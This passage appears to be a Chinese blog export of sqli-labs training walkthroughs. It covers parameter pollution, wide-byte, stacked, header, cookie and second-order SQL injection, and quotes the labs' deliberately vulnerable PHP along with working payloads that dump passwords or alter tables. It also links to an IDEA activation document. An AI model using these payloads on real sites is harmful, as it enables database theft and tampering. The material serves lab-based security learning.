    <content><![CDATA[<h3 id="29-参数污染"><a href="#29-参数污染" class="headerlink" title="29 参数污染"></a>29 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//用`&amp;`分割字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//截取前两位字符</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用&amp;分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) 函数把字符串打散为数组。</span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line">string 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。可能的值：</span><br><span class="line">    大于 0 - 返回包含最多 limit 个元素的数组</span><br><span class="line">    小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组</span><br><span class="line">    0 - 返回包含一个元素的数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>对于<code>login.php?id=1&amp;id=2</code> apache(php)会解析最后一个参数，tomcat(jsp)会解析第一个参数，第一个<code>id</code>会经过<code>whitelist()</code>和<code>java_implimentation()</code></p>
<p><code>whitelist()</code>作用是传入的参数必须是一位及以上的数字</p>
<p><code>java_implimentation()</code>用<code>&amp;</code>分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</p>
<p>参数污染 <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>可以参考<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
<h3 id="30-参数污染"><a href="#30-参数污染" class="headerlink" title="30 参数污染"></a>30 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>和上一关差不多 双引号闭合</p>
<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
<h3 id="31-参数污染"><a href="#31-参数污染" class="headerlink" title="31 参数污染"></a>31 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
<br>

<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br>

<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
<p>在查字段名的时候需要把<code>&#39;users&#39;</code>转成16进制，16进制的表名不需要引号 <code>0x7573657273</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
<br>

<h3 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33 宽字节注入"></a>33 宽字节注入</h3><p>和32一模一样</p>
<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
<br>

<h3 id="34-宽字节注入-POST"><a href="#34-宽字节注入-POST" class="headerlink" title="34 宽字节注入(POST)"></a>34 宽字节注入(POST)</h3><p>过滤方式和上面的一样，可以使用burp直接传，不过POST传入数据时会进行url编码，</p>
<p>在输入 <code>1%df or 1=1#</code>后抓包可以看到前面的<code>%df</code>变成了<code>%25df</code></p>
<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>修改一下即可</p>
<br>

<br>

<h3 id="35-宽字节注入"><a href="#35-宽字节注入" class="headerlink" title="35 宽字节注入"></a>35 宽字节注入</h3><p>和32差不多 只不过这里是字符型，不需要<code>&#39;</code>闭合</p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<br>

<h3 id="36-宽字节注入"><a href="#36-宽字节注入" class="headerlink" title="36 宽字节注入"></a>36 宽字节注入</h3><p>和前面一样</p>
<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)–+</p>
<br>

<h3 id="37-宽字节注入-POST"><a href="#37-宽字节注入-POST" class="headerlink" title="37 宽字节注入(POST)"></a>37 宽字节注入(POST)</h3><p>和34一样</p>
<br>

<h3 id="38-堆叠注入"><a href="#38-堆叠注入" class="headerlink" title="38 堆叠注入"></a>38 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_more_results</span>(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mysqli_multi_query()</code>堆叠注入，多个查询用<code>;</code>分隔</p>
<p>参考<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
<p><code>?id=1&#39;;create table test like users --+</code></p>
<p>发现数据库中新建了名的<code>test</code>的表</p>
<p><code>?id=1&#39;;drop table test; --+</code>删除<code>test</code>表</p>
<p>在<code>uers</code>表添加数据</p>
<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="39-堆叠注入"><a href="#39-堆叠注入" class="headerlink" title="39 堆叠注入"></a>39 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>数字型 不需要闭合</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
<br>

<h3 id="40-堆叠注入"><a href="#40-堆叠注入" class="headerlink" title="40 堆叠注入"></a>40 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="41-堆叠注入"><a href="#41-堆叠注入" class="headerlink" title="41 堆叠注入"></a>41 堆叠注入</h3><p><code>?id=2-1 --+</code>和<code>?id=1 --+</code>返回结果一样</p>
<p>可以判断是数字型，和39一样</p>
<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>idea激活</title>
    <url>/posts/b49b0221/</url>
    <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
]]></content>
      <categories>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs2</title>
    <url>/posts/63ba4580/</url>
    <content><![CDATA[<h3 id="18-UA注入"><a href="#18-UA注入" class="headerlink" title="18 UA注入"></a>18 UA注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><code>check_input()</code>函数先截取前20位，</p>
<p>如果开启GPC,去掉反斜杠，</p>
<p>如果是十进制，有非法字符再转译掉</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          print_r(mysql_error());            </span><br><span class="line">          echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          </span><br><span class="line">          &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">          print_r(mysql_error());</span><br><span class="line">          ... ... </span><br></pre></td></tr></table></figure>

<p>这里对<code>username</code>和<code>password</code>做了处理，但没有对<code>UA</code>处理 这里使用UA·</p>
<p>burp suite抓包改UA <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="19-Referer注入"><a href="#19-Referer注入" class="headerlink" title="19 Referer注入"></a>19 Referer注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br></pre></td></tr></table></figure>

<p>改Referer <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="20-Cookie注入"><a href="#20-Cookie注入" class="headerlink" title="20 Cookie注入"></a>20 Cookie注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">    $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">    $cookee <span class="operator">=</span> $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, <span class="type">time</span>()<span class="operator">+</span><span class="number">3600</span>);    </span><br><span class="line">            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Cookie is: &#x27;</span> .$cookee;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>

<p>改Cookie </p>
<p><code>uname=1.9&#39; and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1  #</code>或者</p>
<p><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat(username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<br>

<br>

<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format <span class="operator">=</span> <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $<span class="type">timestamp</span> <span class="operator">=</span> <span class="type">time</span>() <span class="operator">+</span> <span class="number">3600</span>;</span><br><span class="line">        ... ...</span><br><span class="line"></span><br><span class="line">        $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">        $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">        </span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>

<p>和20关相比，多了base64编码 ，这个使用<code>&#39;)</code>闭合</p>
<p><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code> base64一下</p>
<p><code>MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code></p>
<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            ... ... </span><br><span class="line">            $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">            $cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;</code>闭合，其余和21相同</p>
<br>

<h3 id="23-被过滤-单引号闭合-报错注入"><a href="#23-被过滤-单引号闭合-报错注入" class="headerlink" title="23 #```-- 被过滤 单引号闭合 报错注入"></a>23 <code>#```-- </code>被过滤 单引号闭合 报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>#</code>和<code>-- </code>被过滤了 使用<code>&#39;</code>闭合</p>
<p><code>?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
<p><code>?id=1&#39;%20 order by 5 and &#39;1&#39;=&#39;1</code>无法通过这种方式判断字段数</p>
<p><code>?id=-1&#39; union select 1,2 and &#39;1&#39;=&#39;1</code>报错</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>不报错</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>报错</p>
<p>可以判断有三个字段，2，3是回显点，但是3处输出结果只有0和1，估计是布尔型，所以把2当作输出点</p>
<p>当然这里亦可以使用报错注入，相对简单点</p>
<p><code>?id=-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="24-二次注入"><a href="#24-二次注入" class="headerlink" title="24 二次注入"></a>24 二次注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pass_change.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Validating the user input........</span></span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span 